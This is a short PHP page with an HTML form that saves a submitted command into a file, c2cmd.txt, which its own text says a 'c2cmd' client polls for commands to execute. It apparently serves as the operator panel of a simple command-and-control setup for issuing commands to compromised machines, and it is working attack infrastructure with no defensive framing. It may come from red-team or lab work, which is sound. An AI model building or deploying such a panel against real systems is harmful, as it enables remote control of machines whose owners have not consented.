<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $data = $_REQUEST['command'];
  if (empty($data)) {
    echo "data is empty";
  } else {
    file_put_contents('c2cmd.txt', $data);
  }
}
?>
<html>
<head>
<style>
p {font-family:arial;}
</style>
</head>
<body><form method="POST" action="seetwo.php">
<p>Command to execute - c2cmd will poll c2cmd.txt</p>
<input type="text" name="command" id="command" style="width:400" value="">
<input type="submit" value="Store Command">
</form>
</body>
</html>
